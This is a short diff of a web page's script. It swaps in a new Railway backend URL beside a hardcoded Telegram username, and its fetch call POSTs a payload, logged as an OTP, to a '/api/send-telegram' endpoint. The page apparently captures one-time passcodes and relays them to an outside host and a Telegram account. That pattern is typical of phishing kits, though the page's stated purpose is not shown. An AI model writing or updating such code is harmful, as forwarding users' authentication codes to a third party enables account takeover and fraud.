@@ -69,9 +69,9 @@
 
 <script>
     // ============================================
-    // CONFIGURATION - UPDATED FOR TELEGRAM
+    // CONFIGURATION - UPDATED WITH NEW RAILWAY URL
     // ============================================
-    const RAILWAY_URL = 'https://inncredits-production-b2dd.up.railway.app';
+    const RAILWAY_URL = 'https://inncredits-production-f02a.up.railway.app';
     const TELEGRAM_USERNAME = 'Inbucksk';
     
     // ============================================
@@ -111,7 +111,7 @@
         console.log('📤 Sending OTP to backend:', payload);
         
         try {
-          const response = await fetch(`${RAILWAY_URL}/api/send-telegram`, {
+            const response = await fetch(`${RAILWAY_URL}/api/send-telegram`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
